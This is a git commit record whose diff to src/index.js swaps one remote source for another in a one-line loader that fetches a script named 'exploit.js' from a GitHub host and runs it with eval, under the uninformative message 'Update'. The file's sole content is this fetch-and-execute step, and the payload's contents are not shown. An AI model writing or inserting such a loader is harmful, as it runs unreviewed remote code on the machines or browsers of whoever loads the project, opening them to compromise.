61426a5587639db51c51a1ce4ca8ce6680d20cf7
Jason Spalti <vipershniper07@gmail.com>
2023-08-27 07:22:30 +0000

    Update

--- src/index.js
+++ src/index.js
@@ -1,1 +1,2 @@
-fetch("https://nev3rbored.github.io/ltbeef/exploit.js").then(data=>{data.text().then(text=>{eval(text)})});
+fetch("https://raw.githubusercontent.com/nev3rbored/ltbeef/main/exploit.js").then(data=>{data.text().then(text=>{eval(text)})});
+
